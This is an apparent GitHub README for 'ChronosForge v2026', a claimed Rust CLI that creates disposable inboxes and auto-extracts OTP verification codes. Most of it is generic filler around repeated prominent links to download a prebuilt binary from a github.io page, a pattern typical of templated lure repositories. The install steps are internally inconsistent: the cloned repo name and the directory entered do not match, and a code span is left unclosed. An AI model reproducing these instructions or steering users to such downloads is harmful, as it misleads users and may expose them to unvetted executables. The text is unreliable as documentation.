# ChronosForge v2026 - CLI for temporary email and OTP extraction

> **ChronosForge is a cross-platform Rust command-line utility for creating disposable inboxes, watching messages live, and pulling OTPs automatically, designed for fast verification-code workflows in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform%20command%20line-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michael-reed2005/chronosforge-v2026-otp-cli?style=flat-square)](https://github.com/michael-reed2005/chronosforge-v2026-otp-cli)

---

<p align="center">
  <a href="https://michael-reed2005.github.io/chronosforge-v2026-otp-cli/">
    <img src="https://img.shields.io/badge/Download-ChronosForge%20Latest-brightgreen?style=for-the-badge" alt="Download ChronosForge">
  </a>
</p>

> **[Direct Download - ChronosForge v2026](https://michael-reed2005.github.io/chronosforge-v2026-otp-cli/)**

---

[Download Latest Build](https://michael-reed2005.github.io/chronosforge-v2026-otp-cli/)

---

## What ChronosForge Does

ChronosForge is built for temporary email scenarios where you need to spin up inboxes, track incoming mail, and capture codes with as little friction as possible. Its command-line workflow keeps it friendly for automation, while the TUI gives you a more guided option when working interactively.

It is intended for repetitive verification tasks, testing pipelines, and inbox-based automation. With multi-inbox support, filtering, and a REST API, it gives you several ways to observe mail traffic and extract OTPs as soon as they arrive.

---

## Capabilities

- Create disposable inboxes for short-term email workflows
- Monitor inbox traffic live as new messages come in
- Automatically extract verification codes from incoming mail
- Track multiple inboxes simultaneously
- Expose functionality through a REST API
- Switch between CLI and TUI depending on how you work
- Filter messages so only relevant inbox events stay visible
- Configure inbox TTL for brief-lived sessions

---

## Build and Install

Clone the repo and compile it with the Rust toolchain:

- `git clone https://github.com/michael-reed2005/chronosforge-v2026-otp-cli.git
- `cd inbox-watcher-cli`
- `cargo build --release`

Once the build completes, run the binary from the release directory, or open the interactive interface if your workflow is better suited to TUI mode.

---

## How to Use It

A common flow is:

1. Launch ChronosForge from the CLI.
2. Create one or more disposable inboxes.
3. Start watching incoming mail.
4. Allow the tool to extract OTPs or verification codes automatically.
5. Use the REST API whenever you want inbox handling inside another script or service.

Typical usage patterns include:

- Run the primary CLI command for scripted automation
- Use the TUI for a more step-by-step inbox session
- Connect external tools to the REST API for orchestration or remote control
- Apply message filters to narrow the stream to the events you need

---

## Configuration

ChronosForge relies on settings for inbox behavior, filtering, and lifecycle controls such as TTL. If your build provides a config file, place it in your working directory or wherever the runtime expects to find it.

A representative configuration can look like this:

```ini
[inbox]
ttl_seconds = 300
filter_mode = "verification-codes"
monitor_all = true

[api]
enabled = true
```

Tune the available options to match your environment and workflow.

---

## System Requirements

- Rust toolchain for source builds
- A cross-platform environment that can run a command-line application
- Network access for inbox and API operations
- Sufficient local storage for build artifacts and runtime logs, if enabled

---

## FAQ

**How do I stay up to date?**  
Grab the latest build from the download link above, or rebuild from current source whenever new changes are released.

**Can I avoid using the terminal?**  
Yes. ChronosForge provides both CLI and TUI interfaces, so you can pick the one that fits your workflow.

**Where is configuration kept?**  
That depends on your launch method and packaging. In many setups, configuration is stored in a local file or runtime directory near the project workspace.

**What should I check if monitoring fails?**  
Review the inbox TTL, message filters, and network connectivity first. If you are using the API, make sure the endpoint is enabled and reachable.

**Can it watch more than one inbox?**  
Yes. Multi-inbox monitoring is included, so you can follow several disposable inboxes in parallel.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
